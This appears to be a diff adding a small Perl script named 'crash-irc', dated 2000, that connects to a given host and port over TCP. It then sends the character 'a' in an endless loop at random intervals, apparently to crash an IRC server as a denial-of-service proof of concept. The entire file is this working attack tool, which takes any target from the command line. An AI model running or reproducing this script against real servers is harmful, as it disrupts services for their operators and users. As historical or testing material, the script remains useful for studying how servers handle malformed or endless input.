@@ -1,0 +1,15 @@
+#!/usr/local/bin/perl5 -w
+# $Id: crash-irc,v 1.1 2000/12/05 00:11:57 jnelson Exp $
+use strict;
+use Socket;
+if(!($ARGV[1])){print("usage: $0 host port","\n");exit;}
+my $port = $ARGV[1]; my $proto = getprotobyname("tcp");
+my $iaddr = inet_aton($ARGV[0]) || die "No such host: $ARGV[0]";
+my $paddr = sockaddr_in($port, $iaddr);
+socket(SKT, AF_INET, SOCK_STREAM, $proto) || die "socket() $!";
+connect(SKT, $paddr) && print("Connected established.\n") || die "connect() $!";
+my $infstr = "a";
+while(1){
+select(undef, undef, undef, rand);
+send(SKT,$infstr,0) || die "send() $!";
+}
